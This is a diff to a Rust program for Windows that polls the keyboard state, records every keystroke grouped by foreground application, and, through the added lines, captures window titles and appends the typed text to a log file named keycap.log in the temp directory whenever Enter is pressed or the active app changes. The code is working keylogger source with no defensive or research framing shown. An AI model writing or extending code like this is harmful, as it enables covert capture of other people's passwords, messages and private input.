@@ -1,3 +1,6 @@
+use chrono::prelude::*;
+use std::fs::OpenOptions;
+use std::io::Write;
 use std::{thread, time::Duration};
 use windows_sys::Win32::{
     System::{
@@ -6,13 +9,14 @@ use windows_sys::Win32::{
     },
     UI::{
         Input::KeyboardAndMouse::{GetAsyncKeyState, VK_SHIFT},
-        WindowsAndMessaging::{GetForegroundWindow, GetWindowThreadProcessId},
+        WindowsAndMessaging::{
+            GetForegroundWindow, GetWindowTextLengthW, GetWindowTextW, GetWindowThreadProcessId,
+        },
     },
 };
 
 fn log_message(s: &str) {
     print!("{}", s);
-    use std::io::Write;
     let _ = std::io::stdout().flush();
 }
 
@@ -68,18 +72,51 @@ fn key_notes(k: u8, is_shift_or_caps: bool) -> String {
         0x08 => "<Backspace>".to_string(),
         0x09 => "<Tab>".to_string(),
         0x0D => "<Enter>".to_string(),
-        0x11 => "<Ctrl>".to_string(),
-        0x12 => "<Alt>".to_string(),
         0x1B => "<Esc>".to_string(),
         0x5B | 0x5C => "<Win>".to_string(),
-        0xA2 | 0xA3 => "<Ctrl>".to_string(),
-        0xA4 | 0xA5 => "<Alt>".to_string(),
+        0x12 | 0xA4 | 0xA5 => "<Alt>".to_string(),
         0x10 | 0x14 | 0xA0 | 0xA1 => String::new(),
+        0x11 | 0xA2 | 0xA3 => String::new(),
         _ => String::new(),
     }
 }
 
+fn redraw_line(app_name: &str, tokens: &[String], displayed_len: &mut usize) {
+    let prefix = format!("{}: ", app_name);
+    let content: String = tokens.concat();
+    let new_line = format!("{}{}", prefix, content);
+    let new_len = new_line.len();
+
+    print!("\r");
+    for _ in 0..*displayed_len {
+        print!(" ");
+    }
+    print!("\r");
+    print!("{}", new_line);
+    let _ = std::io::stdout().flush();
+    *displayed_len = new_len;
+}
+
+fn flush_line(log_file: &mut std::fs::File, app_name: &str, window_title: &str, tokens: &[String]) {
+    if tokens.is_empty() {
+        return;
+    }
+    let text: String = tokens.concat();
+    let entry = format!("{}||{}| {}\n", app_name, window_title, text);
+    let _ = log_file.write_all(entry.as_bytes());
+    let _ = log_file.flush();
+}
+
 fn main() {
+    let log_path = std::env::temp_dir().join("keycap.log");
+    let mut log_file = match OpenOptions::new().append(true).create(true).open(&log_path) {
+        Ok(f) => f,
+        Err(e) => {
+            eprintln!("[!] Could not open log file: {}", e);
+            std::process::exit(1);
+        }
+    };
+
     let mut current_app = String::new();
     let mut tokens: Vec<String> = Vec::new();
     let mut displayed_len = 0;
@@ -106,13 +143,26 @@ fn main() {
                 }
             };
 
+            let window_title = {
+                let len = GetWindowTextLengthW(hwnd) + 1;
+                if len > 0 {
+                    let mut buf = vec![0u16; len as usize];
+                    GetWindowTextW(hwnd, buf.as_mut_ptr(), len);
+                    let end = buf.iter().position(|&c| c == 0).unwrap_or(len as usize);
+                    String::from_utf16_lossy(&buf[..end])
+                } else {
+                    "Unknown".to_string()
+                }
+            };
+
             if process_name != current_app {
                 if !current_app.is_empty() {
+                    flush_line(&mut log_file, &current_app, &window_title, &tokens);
                     log_message("\n");
                 }
                 let prefix = format!("{}: ", process_name);
                 log_message(&prefix);
-                current_app = process_name;
+                current_app = process_name.clone();
                 tokens.clear();
                 displayed_len = prefix.len();
             }
@@ -130,6 +180,21 @@ fn main() {
                         continue;
                     }
 
+                    if i == 0x0D {
+                        flush_line(&mut log_file, &current_app, &window_title, &tokens);
+                        tokens.clear();
+                        let prefix = format!("{}: ", current_app);
+                        displayed_len = prefix.len();
+                        print!("\r");
+                        for _ in 0..displayed_len {
+                            print!(" ");
+                        }
+                        print!("\r");
+                        print!("{}", prefix);
+                        let _ = std::io::stdout().flush();
+                        continue;
+                    }
+
                     let key_str = key_notes(i as u8, is_shift_pressed);
                     if !key_str.is_empty() {
                         tokens.push(key_str);
@@ -139,22 +204,4 @@ fn main() {
             }
         }
     }
-}
-
-fn redraw_line(app_name: &str, tokens: &[String], displayed_len: &mut usize) {
-    let prefix = format!("{}: ", app_name);
-    let content: String = tokens.concat();
-    let new_line = format!("{}{}", prefix, content);
-    let new_len = new_line.len();
-
-    print!("\r");
-    for _ in 0..*displayed_len {
-        print!(" ");
-    }
-    print!("\r");
-    print!("{}", new_line);
-    use std::io::Write;
-    let _ = std::io::stdout().flush();
-
-    *displayed_len = new_len;
 }
